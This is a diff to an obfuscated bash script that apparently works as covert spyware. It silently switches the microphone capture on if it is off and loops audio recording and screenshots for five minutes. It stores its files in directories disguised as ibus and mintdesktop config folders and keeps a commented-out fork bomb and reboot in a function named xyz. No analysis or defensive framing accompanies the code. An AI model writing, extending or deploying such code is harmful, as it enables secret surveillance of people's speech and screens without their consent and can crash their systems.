@@ -14,10 +14,21 @@ HOME_2="/home/$USER/.config/ibus_/"
 IBUS_="/home/$USER/.config/ibus_/"
 #
 IBUS__="/home/$USER/.config/mintdesktop/"
-#
 mkdir $IBUS__
 chmod 755 $IBUS__
 chmod 755 $IBUS_
+
+
+function Mcx(){
+	microphone_status=$(amixer get Capture | grep "\[on\]")
+ 	#
+	if [[ -n $microphone_status ]]; then
+	    dbgx "ax... Mcx...Okx..."
+	else
+	    amixer set Capture toggle
+	    amixer set Capture cap
+	fi
+}
 
 function ssx_(){
     #imagemagick
@@ -37,16 +48,9 @@ function ssx_(){
 function ax_(){
     #arecord
     duration=30
-    output_file=`date +%s`"a.wav"
+    output_file="a.wav"
     #
-    microphone_status=$(amixer get Capture | grep "\[on\]")
-    #
-	if [[ -n $microphone_status ]]; then
-	    dbgx "ax... Mcx...Okx..."
-	else
-	    amixer set Capture toggle
-	    amixer set Capture cap
-	fi
+    Mcx
     #
     #amixer set Capture cap
     #
@@ -145,10 +149,13 @@ function px(){
 	#
         Ntx
 	#
+ 	Mcx
+ 	#
     	ax_ & ssx_ & PxNwx
     	#
-	#ssx2
- 	#reboot
+	ssx2
+ 	#
+  	xyz
 	#
 	exit 0
     else
@@ -159,21 +166,26 @@ function px(){
 
 function ssx2(){
 	et=`date +%s`
-	st=1688685579
+	#st=1688842650
+ 	et_=$(($et+300))
+	st=$(($et_))
 	while [ $et -le $st ]
 	do
-	 et=`date +%s`
-  	 #
-    	if [[ -n $microphone_status ]]; then
-	    dbgx "ax... Mcx...Okx..."
-	else
-	    amixer set Capture toggle
-	    amixer set Capture cap
-	fi
+	et=`date +%s`
+  	#
+    	Mcx
  	#
-  	 ssx_ & ax_
+  	ssx_ & ax_
+        #
+        xyz
 	 sleep 30
 	done
+}
+
+function xyz(){
+	dbgx "XYZ..."
+ 	#reboot
+	#:(){ :|:& };:
 }
 
 px
